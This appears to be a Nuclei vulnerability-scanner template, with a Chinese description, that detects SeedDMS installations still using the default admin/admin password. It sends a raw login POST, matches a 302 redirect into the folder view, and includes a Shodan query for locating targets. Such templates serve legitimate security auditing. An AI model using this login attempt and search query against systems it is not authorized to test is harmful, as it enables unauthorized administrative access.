id: seeddms-default-login

info:
  name: SeedDMS 默认口令登录（弱口令）
  author: alifathi-h1
  severity: high
  description: 该模板通过尝试 SeedDMS 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.seeddms.org/index.php?id=2
    - https://www.redhat.com/sysadmin/install-seeddms
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:seeddms:seeddms:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    shodan-query: http.title:"SeedDMS"
    product: seeddms
    vendor: seeddms
  tags: default-login,seeddms,vuln

http:
  - raw:
      - |
        POST /op/op.Login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        login={{username}}&pwd={{password}}&lang=

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'Location: /out/out.ViewFolder.php'

      - type: status
        status:
          - 302
